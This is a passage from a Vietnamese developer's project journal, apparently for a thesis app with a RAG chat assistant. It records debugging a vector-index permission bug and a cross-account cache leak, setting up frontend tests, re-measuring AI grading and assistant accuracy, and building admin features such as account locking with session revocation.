`MaterialChunkRepositoryTest` (6 ca) canh đúng nhánh đó.

> Bài học: **một truy vấn trả rỗng nhìn giống hệt một truy vấn không có dữ liệu.** Nhánh nào của câu
> SQL cũng phải có ít nhất một ca test đòi nó trả về *có*, không chỉ ca đòi nó trả về *không*.

### Cách tôi tự làm chậm mình

Tôi khởi động lại backend dev bảy lần để dò lỗi số 3, mỗi lần gần một phút, và vẫn không ra. Chuyển
sang viết test ở tầng repository với Testcontainers thì ra ngay — vì dữ liệu do chính test chèn nên
không phụ thuộc học liệu mà ca khác chia sẻ.

> Dò lỗi bằng cách chạy tay ứng dụng thật chỉ hợp khi chưa biết lỗi ở đâu. Khi đã khoanh được vào một
> hàm, viết test cho hàm đó **nhanh hơn** và để lại thứ dùng được mãi.

### Quyết định thiết kế

- **Streaming thật**, gọi `:streamGenerateContent?alt=sse`. Không giả lập bằng cách gọi `complete()`
  rồi cắt nhỏ chuỗi: thứ người dùng cảm nhận là *thời gian tới chữ đầu tiên*, mà cách giả lập giữ
  nguyên đúng con số đó.
- **Fallback chỉ chạy trước mảnh đầu tiên.** Đã phát chữ rồi mà đổi provider thì nối câu trả lời của
  hai mô hình thành một đoạn vô nghĩa. Ghi rõ giới hạn này thay vì giả vờ fallback liền mạch.
- **`ChatController` riêng**, không nhồi vào `AiController` (lớp đó CREATOR/ADMIN cấp lớp). Đục một
  lỗ ngoại lệ trong luật phân quyền của cả lớp là cách chắc chắn để sau này có người mở quyền quá tay.
- **Frontend dùng `fetch` chứ không `EventSource`**: `EventSource` chỉ gửi `GET` và không đặt được
  header, nên không mang nổi `Authorization`. Đổi lại được `AbortSignal` cho nút Dừng — nhưng cũng
  mất luôn interceptor làm mới token, nên phải tự gọi hàm refresh dùng chung.

### Ghi chú báo cáo
- **Chương 1 (công nghệ):** SSE với Spring MVC và lý do không dùng `EventSource` ở phía client.
- **Chương 2:** cột `shared` là ví dụ cho việc *đặc tả phải khớp mô hình dữ liệu*; nêu cả mâu thuẫn
  ban đầu chứ không chỉ nêu kết quả.
- **Mục 3.4 (kiểm thử):** lỗi nhánh `materialId = null` là ví dụ đắt giá cho *nhánh nào cũng cần một
  ca test đòi nó trả về có*.
- **"Khó khăn & cách giải quyết":** ba lỗi trên, và chuyện dò lỗi bằng chạy tay chậm hơn viết test.

---

## 📅 T5 — 13/08/2026 — Chỉ mục vector làm sai kết quả, và bốn chỗ giao diện hứa quá tay

**Mục tiêu:** đưa lát cắt 8 đi hết một lượt bằng tay trên trình duyệt trước khi mở PR. Không thêm tính
năng, chỉ kiểm chứng thứ hôm 11/08 đã báo là xong.

**Xong:** một lỗi truy xuất RAG (nặng) · **một lỗi rò dữ liệu giữa các tài khoản** · bốn chỗ điều
hướng/nội dung sai theo vai trò · migration V11 · 2 ca test mới (một ca hành vi, một chốt chặn schema).

### Lỗi nặng: chỉ mục ANN lọc sau, quyền lọc trước

Đăng nhập bằng tài khoản người học rồi hỏi trợ lý một câu **nằm gần như nguyên văn** trong tài liệu đã
bật chia sẻ. Trợ lý đáp *"chưa có tài liệu nào liên quan"*. `sources` rỗng.

Kho vector không hề rỗng — kiểm từng lớp một:

| Kiểm | Kết quả |
|---|---|
| Tài liệu `shared = true`, `status = READY` | ✅ |
| 9 đoạn, đủ 9 embedding, 768 chiều, đã chuẩn hoá | ✅ |
| Điều kiện lọc quyền chạy tay bằng SQL | ✅ 9 dòng |
| Ngưỡng `MAX_DISTANCE = 0.75` quá chặt? | ❌ log ghi `0 đoạn` — chưa tới bước lọc ngưỡng |
| SQL và tham số backend gửi đi (log `TRACE`) | ✅ đúng y file nguồn |

Cùng một câu truy vấn, thêm `order by distance limit 5` thì ra **0 dòng**, bỏ `limit` ra **9 dòng**.
`EXPLAIN ANALYZE` chỉ đúng thủ phạm: `Index Scan using idx_material_chunks_embedding` trả về **2 dòng**,
cả 2 thuộc tài liệu chưa chia sẻ, `Join Filter` loại sạch → rỗng.

```
ivfflat.probes = 1  (mặc định) → 0 đoạn
ivfflat.probes = 100 (quét hết) → 5 đoạn, khoảng cách 0.193–0.319
```

Cơ chế: index xấp xỉ lấy `n` đoạn gần nhất **toàn kho** trước, bộ lọc quyền áp lên `n` dòng đó sau.
Ứng viên không được phép đọc bị loại và **không có gì bù lại**. IVFFlat chia vector thành `lists = 100`
cụm mà chỉ quét 1 cụm; trên vài chục vector, một cụm gần như không chứa gì.

**Sửa:** lọc quyền trong CTE `materialized` rồi mới tính khoảng cách trên đúng tập được phép đọc — tìm
chính xác, không xấp xỉ. V11 bỏ luôn index: ở quy mô vài trăm tới vài nghìn đoạn, quét thẳng nhanh hơn
dựng cây và không bỏ sót. Sau khi sửa: `5 đoạn, giữ 5`, khoảng cách 0.194–0.287, câu trả lời bám slide
và trích dẫn đúng tên tài liệu.

> Bài học: **thêm chỉ mục là một quyết định về độ đúng, không chỉ về tốc độ.** Chỉ mục xấp xỉ đứng
> trước một bộ lọc quyền thì đổi cả kết quả, và đổi trong im lặng — không lỗi, không cảnh báo, kho dữ
> liệu chỉ trông như rỗng. Đây cũng là lần thứ hai trong dự án một lỗi RAG chọn cách *trả về rỗng* thay
> vì *báo hỏng*; cả hai lần đều chỉ lộ ra khi có người đi hết luồng bằng tay.

### Bốn chỗ giao diện hứa thứ người dùng không có quyền làm

Cùng một gốc: trang Học liệu chỉ dành cho Creator, nhưng giao diện không nhất quán với điều đó.

| Chỗ | Trước | Sau |
|---|---|---|
| Navbar | không có mục Học liệu cho **bất kỳ** vai trò nào — trang chỉ vào được bằng gõ URL | có, chỉ hiện với CREATOR/ADMIN |
| Route `/ai/materials`, `/ai/generate` | ai đăng nhập cũng vào được, rồi ăn 403 từ API → trang toàn lỗi | sai vai trò thì đưa về `/quizzes` |
| Gợi ý ô chat | *"tài liệu **của bạn**…"* cho mọi người | người học: *"…học liệu mà người tạo nội dung đã chia sẻ"* |
| Chú thích dưới ô nhập | luôn mời vào trang Học liệu | người học: *"Học liệu do người tạo nội dung nạp và chia sẻ."* |

`ProtectedRoute` nhận thêm prop `roles` để dùng lại cho các khu vực phân quyền sau. Kiểm chứng bằng
tài khoản người học thật: `GET /api/v1/ai/materials` → **403**, tức backend vốn đã chặn đúng; chỗ hỏng
nằm ở tầng giao diện, mời người dùng vào cửa mà sau đó không mở.

> Bài học: một trang **có mà không có đường tới** thì coi như chưa xong. Và giao diện nói với người
> dùng những gì họ *sẽ làm được* — nói quá tay thì thành lời hứa suông, dù backend hoàn toàn đúng.

### Lỗi nặng thứ hai: đăng nhập tài khoản này, thấy dữ liệu tài khoản kia

Đăng nhập lần lượt hai tài khoản trên cùng trình duyệt thì **thấy lịch sử chat của tài khoản trước**.

Backend không sai: `findByUserIdOrderByUpdatedAtDesc(userId)` và `findOwned(id, userId)` đều lọc theo
người gọi. Lỗi ở client, và cơ chế rất đời thường: đăng xuất rồi đăng nhập đều là **điều hướng phía
client**, không có lần nạp lại trang nào ở giữa, nên `QueryClient` tạo một lần ở `main.tsx` sống nguyên
qua cả hai phiên cùng toàn bộ dữ liệu đã tải. Cộng thêm `staleTime: 30_000`, dữ liệu người trước còn
được coi là *tươi* nên trang hiện ra ngay mà **không gọi lại API**.

Không giới hạn ở lịch sử chat — mọi thứ đi qua cache đều rò: lượt làm bài, tiến độ, quiz của tôi, ngân
hàng câu hỏi, học liệu.

**Sửa:** `queryClient.clear()` ở cả bốn lối đổi danh tính (`useLogin`, `useGoogleLogin`, `useRegister`,
`useLogout`). Xoá ở cả lối vào và lối ra vì hai lối không bao hàm nhau — mở thẳng `/login` mà chưa từng
bấm đăng xuất là chuyện thường. Ở lối vào xoá **trước** `setSession()`, để không tồn tại khoảnh khắc nào
danh tính là người mới mà cache là dữ liệu người cũ.

Lúc sửa chưa viết được ca test tự động vì frontend chưa có hạ tầng test; ghi vào nợ chứ không tự mở rộng
phạm vi. **Nợ này đã trả ngày 14/08** — xem mục cùng ngày.

> Bài học: **xoá phiên không chỉ là xoá token.** Phải xoá mọi thứ lưu theo danh tính, mà trong ứng dụng
> một trang thì cache dữ liệu là chỗ dễ quên nhất: nó không nằm trong localStorage để lộ ra khi dọn, và
> nó biến mất mỗi lần F5 nên dò lỗi bằng tay rất dễ tưởng không có vấn đề. Cả ba lỗi nặng của dự án tới
> giờ (nhánh `materialId = null`, chỉ mục IVFFlat, và lần này) đều **không làm chương trình báo lỗi** —
> chúng chỉ trả về dữ liệu sai một cách yên lặng.

### Trả nợ trong ngày: người học thấy được mình hỏi trên tài liệu nào

Món nợ ghi ở đầu ngày đã làm xong ngay trong ngày. `GET /api/v1/ai/chat/materials` trả danh sách học
liệu người gọi được phép hỏi; giao diện `/assistant` thêm khối **"Học liệu hỏi được"** ở cột trái, bấm
một tài liệu là giới hạn câu hỏi trong đúng tài liệu đó.

Bốn quyết định khi làm, mỗi cái tránh một cách hỏng cụ thể:

| Quyết định | Tránh được gì |
|---|---|
| Đặt endpoint ở `ChatController`, không phải `AiController` | Lớp kia chặn CREATOR/ADMIN cấp lớp; đục lỗ ngoại lệ trong luật phân quyền của cả lớp là cách chắc chắn để sau này có người mở quyền quá tay |
| Chỉ trả metadata, **không** trả `content` | Trả kèm nội dung là mở một đường đọc trọn tài liệu mà chủ của nó chưa từng đồng ý — phá đúng lằn ranh đặt ra khi thêm cột `shared` |
| Dùng **cùng phạm vi quyền** với truy vấn vector | Hai chỗ lệch nhau thì giao diện liệt kê một danh sách khác với thứ trợ lý thật sự đọc được: người dùng thấy tài liệu trong danh sách mà hỏi mãi không ra |
| Chỉ liệt kê tài liệu `READY` | Tài liệu đang xử lý chưa có vector; liệt kê ra khiến người học tưởng hỏi được rồi nhận về câu "không biết" |

Kiểm chứng thật bằng tài khoản người học mới: danh sách trả về **đúng 1 tài liệu** đã chia sẻ (không
thấy 2 tài liệu riêng tư của người khác), `mine = false`, và **không có trường nội dung** trong phản hồi.
Hỏi kèm `materialId` thì khối `sources` trả về đúng tài liệu được chọn. `ChatIntegrationTest` 20/20
(thêm 3 ca: phạm vi quyền, không lộ nội dung, cờ `mine` của chủ tài liệu).

Cũng trong hôm nay, `RecommendationIntegrationTest` đã chạy lại được sau khi Docker hết nghẽn: **22/22
xanh**.

### Nợ / chuyển sang ngày sau

- ~~**[!] Người học không thấy mình được hỏi trên tài liệu nào.**~~ **Đã làm** — xem mục trên. Cột `shared` lo được việc truy xuất ra
  gì, nhưng không có đường nào cho người học *xem danh sách* tài liệu đã chia sẻ: `GET /ai/materials`
  vừa chặn CREATOR/ADMIN vừa chỉ trả tài liệu của chính mình, nên mở quyền cũng vẫn rỗng. Họ chỉ biết
  một tài liệu tồn tại sau khi đã hỏi trúng nó qua khối `sources` — trước đó là hỏi mò. Kèm theo:
  `ChatAskRequest.materialId` (giới hạn câu hỏi trong một tài liệu) đã có ở backend và `useChat` cũng
  nhận tham số đó, nhưng giao diện không có cách chọn vì không có danh sách — nửa tính năng xây rồi mà
  chưa dùng được. Hướng làm đã ghi ở `features/08`: endpoint `GET /ai/chat/materials` đặt trong
  `ChatController`, trả **chỉ metadata**, không trả nội dung.
- ~~**[!] Frontend chưa có hạ tầng test** (không vitest/jest).~~ **Đã dựng ngày 14/08** — xem mục hôm đó.
- ~~`RecommendationIntegrationTest` vẫn chờ chạy lại.~~ **Đã chạy: 22/22 xanh.**
- **Đo lại mục 3.6:** mọi số grounding trước 13/08 đo trên đường truy xuất đang lỗi.
- Chương 1 và Chương 2 của báo cáo.

### Ghi chú báo cáo
- **Chương 1 (công nghệ):** pgvector — đánh đổi giữa tìm chính xác và tìm xấp xỉ (IVFFlat/HNSW), và
  điều kiện để ANN có nghĩa (số vector phải lớn hơn số cụm rất nhiều lần).
- **Chương 2 (thiết kế):** thứ tự *lọc quyền trước, xếp hạng sau* là một ràng buộc thiết kế của RAG có
  phân quyền, không phải chi tiết tối ưu.
- **Mục 3.4 (kiểm thử):** đây là ví dụ tốt cho *giới hạn của kiểm thử hồi quy*, nên viết thẳng cả phần
  không làm được. Bộ test cũ xanh suốt dù lỗi đang tồn tại, vì mỗi ca chỉ chèn 2 đoạn — quá ít để bộ tối
  ưu chọn đi qua chỉ mục. Tôi viết ca hồi quy theo hành vi, rồi **thử lại bằng chính truy vấn bản lỗi để
  xem test có đỏ không: nó vẫn xanh.** Thử buộc bằng `enable_seqscan = off` trên một kết nối riêng cũng
  không đủ, vì câu truy vấn thật có JOIN nên kế hoạch rẽ hướng khác. Kết luận: lỗi này phụ thuộc **kế
  hoạch thực thi**, không phụ thuộc ngữ nghĩa SQL, nên không tái hiện ổn định ở quy mô dữ liệu test.
  Thay bằng **chốt chặn ở tầng schema** — khẳng định `material_chunks` không có chỉ mục `ivfflat`/`hnsw`,
  tức chặn đúng điều kiện làm lỗi tái phát, kèm thông điệp chỉ rõ phải làm gì nếu thật sự cần ANN. Bài
  học đáng ghi: **một ca test xanh ở cả bản đúng và bản lỗi thì không bảo vệ gì cả** — phải thử làm nó
  đỏ mới biết nó có tác dụng.
- **Mục 3.6 (độ chính xác AI):** số đo trước ngày này lấy trên đường truy xuất đang lỗi. Nếu có phần
  đánh giá grounding thì phải **đo lại** sau V11.
- **"Khó khăn & cách giải quyết":** hai mục trên. Điểm chung: cả hai đều không làm chương trình báo lỗi,
  nên chỉ chạy thật mới thấy — build xanh và test xanh đều không đủ.

---

## 📅 T6 — 14/08/2026 — Dựng hạ tầng test frontend, và một xung đột phiên bản không ai nói trước

**Mục tiêu:** trả hai món nợ ghi hôm qua — hạ tầng test frontend, và đưa bộ báo cáo vào git.

**Xong:** vitest + testing-library · 3 ca hồi quy cho lỗi rò cache · bộ báo cáo vào git kèm README.

### Ca test đầu tiên viết cho đúng lỗi hôm qua

Lỗi rò dữ liệu giữa hai tài khoản (13/08) không có ca test nào vì frontend chưa có chỗ để viết. Nay có:
`useAuthMutations.test.tsx`, ba ca — đăng nhập xoá cache, đăng xuất xoá cache, và **xoá đúng trước khi
đặt phiên mới**.

Ca thứ ba là ca đáng chú ý: nó kiểm *thứ tự*, không kiểm kết quả. Nếu `setSession` chạy trước
`queryClient.clear()` thì vẫn "có xoá cache" nhưng tồn tại một khoảnh khắc component đã thấy người dùng
mới trong khi đọc được dữ liệu người cũ — đủ để render ra. Ca này chặn đúng khoảnh khắc đó bằng cách ghi
lại trình tự hai lời gọi.

Cả ba kiểm ở **tầng hook** chứ không tầng giao diện, vì đây là lỗi của *vòng đời cache* chứ không của một
trang cụ thể: kiểm một trang chỉ chứng minh trang đó sạch, còn cache là thứ mọi trang dùng chung.

**Và lần này thử làm chúng đỏ trước khi tin:** bỏ `queryClient.clear()` khỏi `useLogin`/`useLogout` →
**cả 3 ca đỏ**; khôi phục → xanh lại. Đây là bước hôm qua đã dạy: một ca test xanh ở cả bản đúng và bản
lỗi thì không bảo vệ gì cả.

### Xung đột phiên bản: vitest 3 chưa hỗ trợ Vite 8

Cách làm thông thường là nhồi trường `test` vào `vite.config.ts` và lấy `defineConfig` từ `vitest/config`.
Làm vậy thì `npm test` chạy được, nhưng **`npm run build` đổ** với một lỗi kiểu dài mười mấy dòng:
`Plugin<any>[] is not assignable to PluginOption`.

Nguyên nhân: vitest 3 chưa hỗ trợ Vite 8 nên nó **tự cài một bản vite riêng** trong `node_modules/vitest/`.
Hai bản vite dùng hai bộ type plugin khác nhau — Vite 8 đã chuyển sang rolldown, bản kia còn rollup — nên
danh sách `plugins` không khớp kiểu giữa hai bên. Thử cách chính thống `/// <reference types="vitest/config" />`
cũng không cứu được, vì reference đó cũng trỏ về bản vite của vitest.

**Cách xử lý:** tách hẳn `vitest.config.ts` riêng, và cố ý **không** đưa nó vào `include` của
`tsconfig.node.json` nên `tsc -b` không kiểm nó. Đổi lại phải khai lại alias `@` và plugin react trong
file đó — cái giá nhỏ so với việc để lệnh build của dự án đỏ. Đã ghi chú trong file là khi vitest lên bản
hỗ trợ Vite 8 thì gộp lại và xoá file này.

Kiểm chứng cả hai lệnh cùng lúc: `tsc -b` sạch, `npm run build` thành công (3327 module, 27s), `npm test`
3/3 xanh.

> Bài học: **thêm một công cụ dev không phải chuyện chỉ của công cụ đó.** Cấu hình test và cấu hình build
> dùng chung một file thì hai hệ phiên bản kéo nhau, và triệu chứng lại hiện ra ở lệnh *build* chứ không ở
> lệnh *test* — dễ tưởng là lỗi của mã sản phẩm. Chạy đủ cả `test` và `build` sau khi thêm công cụ mới,
> đừng chỉ chạy cái mình vừa thêm.

### Bộ báo cáo vào git

`bao-cao-datn/` trước đó nằm ngoài git. Nay track theo lối "nội dung là text, sản phẩm là thứ build ra":
4 file `.md` + 39 hình PNG + toàn bộ script sinh hình. **Không** track `node_modules`, `plantuml.jar`, bản
`.docx` (sinh lại được bằng một lệnh, mà mỗi lần build tạo diff binary ~5MB không đọc được để review), và
`Testcase+TestPlan/` (còn là tài liệu của đồ án khác). Kèm README hướng dẫn dựng lại và quy ước viết.

### Đo lại mục 3.6 — và phép đo tự tìm ra một hạn chế

Số liệu 3.6 trước 13/08 đo trên đường truy xuất đang lỗi nên bỏ hết. Đo lại hôm nay, đầy đủ ở
`so-lieu-3.6-do-chinh-xac-ai.md`. **21 lượt gọi mô hình, tất cả thành công, không bài nào `AI_FAILED`.**

| Hạng mục | Kết quả |
|---|---|
| Chấm tự luận — điểm trong khoảng chuẩn | **7/8**, sai lệch trung bình **0,13/10** |
| Chống tiêm chỉ thị | **2/2** bài tấn công bị chặn (0 điểm) |
| Sinh đề — câu đúng chuẩn cấu trúc | **10/10**, không câu nào bị bộ kiểm duyệt loại |
| Trợ lý — có học liệu | **3/3** trả lời đúng con số, kèm trích dẫn |
| Trợ lý — ngoài học liệu | **2/2** nói không biết, không suy đoán từ kiến thức nền |

Bài lệch duy nhất: bài nêu đủ ba ý nhưng viết cụt lủn được AI cho 10/10 trong khi rubric chỉ cho 7–9 —
mô hình **rộng tay với tiêu chí định tính**. Nó nhận diện tốt phần *nội dung* (đủ mấy ý) nhưng dễ bỏ
qua phần *chất lượng diễn đạt*. Thứ tự chất lượng thì đúng hoàn toàn: 10 → 10 → 7 → 4 → 0 → 0, không có
bài kém nào được điểm cao hơn bài tốt.

**Hai bài học từ chính phép đo.**

*Thứ nhất, tiêu chí đo sai làm con số vô nghĩa.* Hạng mục "nói không biết" ban đầu in ra **0/2**, và
nếu tin luôn thì báo cáo sẽ ghi "trợ lý suy đoán bừa" — sai hoàn toàn. Nhìn dữ liệu thô mới thấy mô
hình **đã** nói không biết ở cả hai câu; điều không thoả là điều kiện thứ hai tôi gộp vào cùng tiêu chí
("không có nguồn nào"). *"Mô hình có suy đoán bừa không"* và *"hệ thống có hiện nguồn dư không"* là hai
câu hỏi riêng — trộn vào một tiêu chí thì không trả lời được câu nào.

*Thứ hai, phép đo tìm ra một hạn chế mà đọc code không thấy.* Với câu ngoài học liệu, hệ thống **vẫn
trả về 2 nguồn**, vì danh sách nguồn gửi ở sự kiện `meta` **trước** khi mô hình kịp trả lời — nó phản
ánh "có đoạn nào vượt ngưỡng 0,75" chứ không phản ánh "mô hình có dùng đoạn đó". Trên giao diện, người
dùng thấy câu *"tôi không có thông tin"* mà bên dưới có khối *"Dựa trên: …"* — hai thứ nói ngược nhau.

Hai hướng xử lý (siết ngưỡng, hoặc chuyển danh sách nguồn sang cuối luồng) đều **cần đo thêm trước khi
chọn**: chọn ngưỡng mới mà không có số liệu khoảng cách thực tế thì chỉ là đổi một con số tuỳ ý bằng
một con số tuỳ ý khác. Ghi vào nợ.

> Bài học: **một phép đo tốt phải đo được cả mặt "không được làm gì".** Nếu chỉ đo "trả lời đúng khi có
> tài liệu", một trợ lý luôn luôn trả lời cũng đạt 100% kể cả khi nó bịa.

### Nợ / chuyển sang ngày sau

- **[!] Nguồn vẫn hiện dù trợ lý nói không biết** — cần đo khoảng cách thực tế rồi mới chọn cách sửa.
- **Chương 3 + Kết luận** của báo cáo — giờ đã có đủ số liệu 3.5 và 3.6.
- Số liệu khảo sát biểu mẫu (mục 2.1.4 báo cáo).
- Thay `Testcase+TestPlan/` bằng tài liệu test của đề tài này (dùng cho mục 3.4).
- Mở rộng test frontend sang các luồng khác: hạ tầng đã có, giờ thêm ca chỉ là viết file.

### Ghi chú báo cáo
- **Mục 3.4 (kiểm thử):** bổ sung phần kiểm thử frontend — nêu rõ ba ca hồi quy và **cách kiểm chứng ca
  test có tác dụng** (làm nó đỏ với bản lỗi rồi mới tin). Đây là điểm khác biệt so với việc chỉ báo "test
  xanh".
- **"Khó khăn & cách giải quyết":** xung đột vitest 3 ↔ Vite 8 là ví dụ tốt cho việc *lỗi hiện ra ở nơi
  khác chỗ gây lỗi* — triệu chứng ở lệnh build, nguyên nhân ở cấu hình test.

---

## 📅 T6 — 14/08/2026 (chiều) — Lát cắt 10: Quản trị, và lặp lại đúng một cái bẫy đã ghi bài học

**Mục tiêu:** tính năng `[S]` đầu tiên sau khi đóng hết mức `[M]`. Chọn Quản trị vì nó là thứ duy nhất
chặn mục 3.3 báo cáo (*Giao diện phía quản trị*), và Chương 2 đã đặc tả sẵn bốn tác nhân.

**Xong:** migration V12 · 3 API quản lý người dùng + 1 API giám sát AI · 2 trang giao diện · 10 ca test.

### Khoá tài khoản, không xoá người dùng

Không làm endpoint xoá người dùng. Bài đã làm, quiz đã soạn, học liệu đã chia sẻ đều là dữ liệu **người
khác đang dùng hoặc đang được thống kê**: một quiz công khai có thể đang có người làm, một lượt làm bài
nằm trong bảng xếp hạng, một tài liệu đã chia sẻ đang là nguồn cho trợ lý trả lời. Xoá tài khoản kéo theo
xoá hoặc làm mồ côi những thứ đó.

### Điều dễ làm sai nhất: "khoá" mà không có hiệu lực ngay

Đặt cờ `locked = true` là chưa đủ, và đây là chỗ dễ tưởng đã xong:

| Nếu chỉ đặt cờ | Hệ quả |
|---|---|
| Access token đang cầm | vẫn dùng được **15 phút** |
| Refresh token đang cầm | vẫn gia hạn được **tới 14 ngày** |

Tức "khoá" chỉ thực sự có hiệu lực sau vài phút tới vài ngày — đúng lúc quản trị viên tin rằng nó có
hiệu lực ngay. Nên khoá phải **thu hồi toàn bộ phiên**, và trạng thái khoá kiểm ở **cả** `login` **và**
`refresh`: chặn một lối mà bỏ lối kia thì bất kỳ đường nào cấp lại token về sau cũng mở lại cửa.

Cùng lý do đó, **đổi vai trò cũng phải thu hồi phiên**: vai trò nằm trong access token, không thu hồi
thì người vừa bị hạ quyền còn dùng quyền cũ thêm 15 phút.

Kiểm chứng thật, không chỉ qua test: khoá xong thì refresh token cũ trả **401**, đăng nhập lại trả
**403** kèm câu *"Tài khoản đã bị khoá…"*. Mở khoá thì vào lại được ngay.

### Thông báo: cân giữa "nói rõ cho người dùng" và "không tiết lộ cho kẻ tấn công"

Trả *"tài khoản bị khoá"* thì tiết lộ email đó tồn tại — đúng thứ mà thông báo gộp *"email hoặc mật khẩu
không đúng"* đang tránh. Nhưng giữ nguyên câu gộp thì người dùng thật sẽ đi đặt lại mật khẩu hết lần này
lần khác mà vẫn không vào được.

Cách giải: kiểm `locked` **sau** khi đã khớp mật khẩu. Lúc đó người gọi đã chứng minh họ biết mật khẩu,
nên câu "bị khoá" không cho thêm thông tin gì cho kẻ tấn công.

### Lặp lại đúng một cái bẫy dự án đã ghi bài học

Truy vấn danh sách người dùng đổ **500** với `ERROR: function lower(bytea) does not exist`.

Nguyên nhân: viết `like lower(concat('%', :keyword, '%'))` rồi truyền `null` vào `keyword` — driver
PostgreSQL không suy được kiểu tham số nên gửi dưới dạng `bytea`. Mất luôn cả nhánh "không lọc theo từ
khoá", tức nhánh mặc định của trang.

Đây **cùng một cái bẫy** đã ghi ở `MaterialChunkRepository` ngày 11/08: *cẩn thận với tham số null trong
biểu thức `:x is null`*. Lần đó nhánh null lặng lẽ trả rỗng; lần này nó đổ hẳn 500 — dễ phát hiện hơn,
nhưng gốc y nguyên.

`QuizRepository` đã làm đúng từ trước và tôi không đọc lại trước khi viết: nó gọi `lower()` lên **cột**,
còn tham số được bọc `%` sẵn ở tầng service. Đã sửa theo đúng mẫu đó.

> Bài học: **ghi bài học vào tài liệu không đủ — phải đọc lại mã đã có cho cùng loại việc.** Dự án đã có
> một truy vấn lọc-nhiều-tiêu-chí chạy đúng; mở nó ra xem trước khi viết cái thứ hai thì mất một phút,
> còn dò lỗi 500 mất nửa giờ.

### Hai việc quản trị viên không làm được

Chặn ở **tầng nghiệp vụ**, không tin vào việc giao diện ẩn nút: không tự khoá và không tự hạ vai trò
chính mình. Hệ thống chỉ có một cấp quản trị nên một lần bấm sai là mất quyền mà không còn ai mở lại
được. Giao diện cũng vô hiệu hoá hai thao tác đó với chính hàng của người đang đăng nhập — để nút bấm
được rồi báo lỗi là bắt người dùng học bằng cách thất bại.

### Giám sát AI: số liệu thật đã có ngay

Trang giám sát đọc `ai_request_logs`, và vì hệ thống đã chạy thật nên nó có số ngay: **306 lượt gọi
trong 30 ngày, 141 thành công, 165 thất bại, 39 220 token vào / 12 102 token ra, độ trễ trung bình
2 953 ms và P95 9 051 ms.** Tỉ lệ thất bại 54% là dữ liệu lịch sử của những lần đụng hạn mức hồi 08/08
khi chưa giãn nhịp — đúng thứ trang này ra đời để cho thấy.

Một chi tiết nhỏ nhưng có ý: độ trễ trả `null` khi chưa có lời gọi nào để tính, **không** trả 0. Chức
năng `explain-answer` hiện đúng như vậy (11 lượt, không có số độ trễ). 0 ms là một giá trị có nghĩa,
còn "chưa đo" thì không — gộp hai thứ thành 0 làm giao diện hiển thị một độ trễ không tồn tại.

### Còn nợ trong lát cắt này

- **FR-80** ẩn quiz công khai vi phạm — chưa làm.
- **FR-83/FR-84** trạng thái cấu hình nhà cung cấp AI và hạn mức lượt gọi — chưa làm. Phần này đòi sửa
  `AiOrchestrator` đang chạy tốt, nên để sau khi những phần không rủi ro đã xong.

### Ghi chú báo cáo
- **Mục 3.3 (giao diện quản trị):** giờ có hai màn thật để chụp — Quản lý người dùng và Giám sát AI.
- **Mục 2.6 (đặc tả UC):** bổ sung UC-14 với luồng thay thế *"tự khoá chính mình → 400"*.
- **"Khó khăn & cách giải quyết":** lỗi `lower(bytea)` là ví dụ tốt cho việc *bài học đã ghi vẫn lặp lại
  nếu không đọc lại mã cùng loại việc*. Nêu cả hai lần gặp, không chỉ lần này.

---

## 📅 T6 — 14/08/2026 (tối) — Khu quản trị thành một khu riêng, và một ô nhập cố ý không làm

**Mục tiêu:** hoàn thiện lát cắt 10. Điểm khởi đầu là nhận xét của chính người dùng dự án: *"trang admin
phải làm với 1 giao diện khác thay vì thêm trên menu chứ"* — và nhận xét đó đúng.

**Xong:** 16 endpoint · 6 mục sidebar · 4 trang mới · biểu đồ Recharts · 19 ca test pass · 2 wireframe
báo cáo (Hình 2.38, 2.39).

### Vì sao khu quản trị cần khung giao diện riêng

Trước đó khu quản trị chỉ là một menu xổ xuống trên thanh điều hướng của khu học tập. Ba lý do để tách:

| Lý do | Cụ thể |
|---|---|
| **Ngữ cảnh làm việc khác** | Menu "Khám phá / Phòng đấu / Trợ lý AI / Lộ trình / Tiến độ" không liên quan gì khi đang khoá tài khoản hay đọc chi phí AI |
| **Trông khác là một lớp an toàn** | Thao tác ở đây tác động lên **người khác** và không có nút hoàn tác. Nền tối + sidebar khiến admin luôn biết mình đang ở đâu, thay vì tưởng vẫn ở trang cá nhân rồi bấm nhầm |
| **Mở rộng được** | Sidebar dọc chứa 6 mục vẫn gọn; thanh ngang của khu học tập đã có 10 mục và sẽ tràn hàng |

Lối vào chuyển vào menu tài khoản, lối ra là "Về khu học tập" ngay đầu sidebar — chuyển ngữ cảnh phải đi
được **cả hai chiều**, không để ai mắc kẹt một bên.

### Ô nhập hạn mức AI: cố ý KHÔNG làm (FR-84)

Thiết kế ban đầu có `PUT /admin/ai/quota` — "mỗi người tạo nội dung tối đa N lượt gọi AI mỗi ngày". Làm
được ngay, nhưng `AiOrchestrator` **không đọc con số đó** và cũng chưa đếm lượt gọi theo từng người dùng.
Một ô nhập lưu được giá trị mà không chặn được gì **tệ hơn là không có nó**: quản trị viên tin rằng chi
phí đã bị giới hạn, trong khi thực tế không. Đây cùng một loại lỗi với việc bịa số liệu cho giao diện đẹp,
chỉ là ở dạng khó thấy hơn.

Nên endpoint cấu hình AI **chỉ đọc**: trả `daCauHinh: true/false` cho từng nhà cung cấp, không bao giờ trả
giá trị khoá, và không đọc cũng không ghi system prompt (prompt là nơi đặt bốn lớp chống tiêm chỉ thị khi
chấm bài — đọc được là bước đầu để sửa được). Phép kiểm chốt **đúng năm trường** của mỗi nhà cung cấp, nên
thêm bất kỳ trường nào — kể cả "khoá đã che một phần" — làm test đỏ.

### Đóng phòng là `POST .../close`, không phải `DELETE`

Thiết kế đầu ghi `DELETE /admin/rooms/{code}`. Nhưng thao tác này **không xoá** bản ghi phòng: nó chuyển
phòng sang `FINISHED` và xoá trạng thái Redis. Bản ghi phải còn vì điểm cuối ván của những người đã chơi
nằm ở `game_room_players` tham chiếu tới nó. Một `DELETE` không xoá gì là tên gọi nói sai việc nó làm, nên
đổi thành `POST .../close` và ghi rõ lý do vào `api.md`.

Phòng đấu là phần duy nhất của hệ thống có trạng thái sống ở **hai nơi** — metadata ở PostgreSQL, trạng
thái đang chơi ở Redis kèm TTL. Khi hai nơi lệch nhau thì phòng "treo": hiện trong danh sách nhưng không
ai chơi được. Trang giám sát tính thành một cờ `treo` riêng, và `soNguoiChoi` trả `null` thay vì 0 khi
không đọc được Redis — "không rõ" khác "phòng trống", và gộp lại thì mất đúng thông tin cần tìm.

### Một phép kiểm suýt nữa vô nghĩa

Test "ẩn quiz thì nó biến khỏi danh sách" ban đầu chỉ kiểm danh sách **sau khi** ẩn là rỗng. Nhưng nếu từ
